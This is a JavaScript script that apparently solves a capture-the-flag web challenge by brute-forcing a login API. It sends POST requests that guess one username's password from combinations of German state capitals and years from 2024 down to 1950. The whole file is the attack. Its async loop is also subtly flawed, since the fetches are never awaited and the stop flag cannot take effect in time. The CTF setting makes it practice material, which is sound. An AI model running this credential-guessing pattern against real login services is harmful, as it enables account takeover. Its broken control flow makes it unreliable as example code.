// fetch with cookie

const germanCapitals = [
  "Stuttgart", // Baden-Württemberg
  "München", // Bavaria (Bayern)
  "Berlin", // Berlin
  "Potsdam", // Brandenburg
  "Bremen", // Bremen
  "Hamburg", // Hamburg
  "Wiesbaden", // Hesse (Hessen)
  "Hanover", // Lower Saxony (Niedersachsen)
  "Schwerin", // Mecklenburg-Vorpommern
  "Düsseldorf", // North Rhine-Westphalia (Nordrhein-Westfalen)
  "Mainz", // Rhineland-Palatinate (Rheinland-Pfalz)
  "Saarbrücken", // Saarland
  "Dresden", // Saxony (Sachsen)
  "Magdeburg", // Saxony-Anhalt (Sachsen-Anhalt)
  "Kiel", // Schleswig-Holstein
  "Erfurt", // Thuringia (Thüringen)
];
let solved = false;
let year = 2024;

while (!solved) {
  for (const capital of germanCapitals) {
    const myHeaders = new Headers({
      "Content-Type": "application/json",
    });
    const out = fetch("https://code-ctf-2-web-3.vercel.app/api/login", {
      method: "POST",
      headers: myHeaders,
      body: JSON.stringify({
        username: "marc050397",
        password: `${capital}${year}`,
      }),
    }).then((res) =>
      res.json().then((data) => {
        if (data.message !== "username does not exist" && data.message !== "wrong password") {
          console.log(data);
          console.log(capital, year);
          solved = true;
        }
      }),
    );
  }
  year = year - 1;

  if (year < 1950) {
    break;
  }
}
